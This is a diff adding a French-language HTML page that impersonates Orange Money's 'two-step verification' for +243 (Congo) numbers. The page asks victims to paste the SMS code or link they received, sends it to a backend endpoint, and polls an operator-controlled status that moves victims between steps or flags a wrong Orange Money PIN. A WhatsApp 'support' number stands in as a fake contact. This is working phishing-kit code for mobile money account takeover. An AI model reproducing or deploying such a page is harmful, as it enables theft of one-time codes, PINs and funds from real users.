@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Vérification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        .header-box {
+            width: 100%;
+            background: #ff7900;
+            padding: 25px 20px 40px 20px;
+            color: white;
+            text-align: center;
+            box-sizing: border-box;
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            box-sizing: border-box;
+            align-self: flex-start;
+        }
+
+        h2 {
+            margin: 0 0 15px 0;
+            font-size: 22px;
+            color: #111;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 10px 0;
+            line-height: 1.4;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            border: 2px solid #ff7900;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            resize: none;
+            font-family: inherit;
+            color: #333;
+        }
+
+        textarea::placeholder {
+            color: #aaa;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            margin: 25px 0 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #e0e0e0;
+            color: #999;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: not-allowed;
+            text-transform: uppercase;
+        }
+
+        .submit-btn.active {
+            background-color: #ff7900;
+            color: white;
+            cursor: pointer;
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: #ff7900;
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        /* Fullscreen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .overlay-card {
+            background: #ff7900;
+            color: white;
+            padding: 30px 20px;
+            border-radius: 16px;
+            width: 85%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .overlay-desc {
+            font-size: 14px;
+            color: #fff;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: white;
+            color: #ff7900;
+            font-weight: bold;
+            padding: 12px 10px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            word-break: break-all;
+            font-size: 13px;
+        }
+
+        .error-message {
+            color: #d9534f;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    Orange Money
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Vérification en Deux Étapes</h2>
+
+        <p class="instruction">
+            Collez le lien / message SMS complet envoyé à votre numéro
+        </p>
+
+        <div class="phone-number" id="displayPhone">+243 ...</div>
+
+        <textarea id="smsInput" placeholder="Collez ici votre lien / message SMS complet..."></textarea>
+        <div id="errorText" class="error-message">Le lien est incorrect ou le lien a expiré, téléchargez un nouveau lien que vous recevez.</div>
+
+        <div class="resend-text" id="timerBox">
+            Renvoyer dans <span id="timer">60</span> secondes
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>SOUMETTRE</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- Overlay de Chargement (Orange Theme) -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Veuillez patienter</div>
+    </div>
+</div>
+
+<!-- Overlay Contactez-nous WhatsApp (Orange Theme) -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Contactez-nous sur WhatsApp</div>
+        <div class="overlay-desc">Utilisez l'une des deux options ci-dessous pour nous contacter :</div>
+        
+        <a href="https://api.whatsapp.com/send?phone=243855275313t&text=Jambo!%20I'd%20PESA%20Napata%20dje" target="_blank" class="wa-btn">
+            Cliquez sur ce lien :<br>https://api.whatsapp.com/send?phone=243855275313
+        </a>
+
+        <div class="overlay-desc" style="margin-top: 10px; margin-bottom: 5px;">Ou via ce numéro :</div>
+        <div style="font-size: 18px; font-weight: bold; background: white; color: #ff7900; padding: 10px; border-radius: 8px; width: 100%; box-sizing: border-box;">
+            +243855275313
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const smsInput = document.getElementById('smsInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Charger le numéro de téléphone
+    const savedPhone = localStorage.getItem('phone');
+    if (savedPhone) {
+        displayPhone.textContent = `+243${savedPhone.replace(/^\+?243/, '')}`;
+    } else {
+        displayPhone.textContent = "+243 ...";
+    }
+
+    // Activer/Désactiver le bouton de soumission
+    smsInput.addEventListener('input', () => {
+        const hasText = smsInput.value.trim().length > 0;
+        submitBtn.disabled = !hasText;
+        submitBtn.classList.toggle('active', hasText);
+        errorText.style.display = 'none';
+    });
+
+    // Compte à rebours
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:#ff7900; cursor:pointer;" onclick="location.reload()">Renvoyer le code</span>';
+        }
+    }, 1000);
+
+    // Vérification du statut sur le serveur
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9"; // Redirection vers page9
+                } else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "Le lien est incorrect ou le lien a expiré, téléchargez un nouveau lien que vous recevez.";
+                    errorText.style.display = "block";
+                    smsInput.value = "";
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } else if (data.status === "otp2_wrongpin") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    alert("Le code PIN est incorrect. Veuillez saisir le code PIN Orange Money correct.");
+                    window.location.href = "/page6"; // Redirection vers page6
+                } else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Erreur de vérification du statut:", err);
+            }
+        }, 2000);
+    }
+
+    // Action lors de la soumission
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        const pastedLink = smsInput.value.trim();
+        if (!pastedLink) return;
+
+        // Affichage de l'overlay de chargement
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: pastedLink
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Erreur lors de l'envoi.");
+            }
+        } catch (err) {
+            console.error("Erreur de soumission:", err);
+            statusOverlay.style.display = "none";
+            alert("Erreur de connexion.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
